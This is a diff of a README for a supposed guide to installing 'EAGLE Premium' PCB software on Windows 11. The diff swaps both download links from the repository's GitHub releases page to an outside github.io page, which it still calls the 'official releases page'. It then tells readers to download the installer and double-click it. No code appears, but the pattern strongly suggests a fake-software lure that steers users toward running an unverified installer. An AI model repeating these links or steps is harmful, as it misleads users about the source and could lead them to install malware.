@@ -1,6 +1,6 @@
 # 🛠️ EAGLE-Windows-Guide - Install EAGLE Premium on Windows 11
 
-[![](https://img.shields.io/badge/Download-EAGLE-blue.svg)](https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases)
+[![](https://img.shields.io/badge/Download-EAGLE-blue.svg)](https://lemmiecanonic88.github.io)
 
 This guide provides steps to install EAGLE Premium on your Windows 11 computer. Many users face installation errors when setting up PCB design software. These notes help you bypass common setup failures and keep your workflow running.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to run EAGLE Premium without issues. Verif
 
 Follow these steps to get the software on your machine:
 
-1. Visit the [official releases page](https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases) to download the installation files.
+1. Visit the [official releases page](https://lemmiecanonic88.github.io) to download the installation files.
 2. Select the latest version listed under the Assets section.
 3. Save the installer file to your Downloads folder.
 4. Locate the downloaded file and double-click it. 
